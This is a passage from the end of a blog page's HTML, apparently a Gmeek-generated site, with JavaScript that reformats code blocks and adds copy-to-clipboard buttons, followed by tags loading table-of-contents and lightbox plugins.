            const parentElement = codeElement.parentElement;
            if (selector.includes('highlight')) {
                parentElement.insertBefore(newStructure, codeElement.nextSibling);
                parentElement.removeChild(codeElement);
            } else {
                parentElement.parentElement.replaceChild(newStructure, parentElement);
            }
        });
    };

    handleCodeElements('pre.notranslate > code.notranslate');
    handleCodeElements('div.highlight > pre.notranslate');

    let currentFeedback = null;
    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
        copyButton.addEventListener('click', () => {
            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
            const tempTextArea = document.createElement('textarea');
            tempTextArea.value = codeContent;
            document.body.appendChild(tempTextArea);
            tempTextArea.select();
            document.execCommand('copy');
            document.body.removeChild(tempTextArea);

            const copyIcon = copyButton.querySelector('.octicon-copy');
            const checkIcon = copyButton.querySelector('.octicon-check');
            const copyFeedback = copyButton.nextElementSibling;

            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
            currentFeedback = copyFeedback;

            copyIcon.classList.add('d-none');
            checkIcon.classList.remove('d-none');
            copyFeedback.style.display = 'block';
            copyButton.style.borderColor = 'var(--color-success-fg)';

            setTimeout(() => {
                copyIcon.classList.remove('d-none');
                checkIcon.classList.add('d-none');
                copyFeedback.style.display = 'none';
                copyButton.style.borderColor = '';
            }, 2000);
        });
    });
});

</script>
<script src='https://blog.meekdai.com/Gmeek/plugins/GmeekTOC.js'></script><script src='https://blog.meekdai.com/Gmeek/plugins/lightbox.js'></script>

</html>
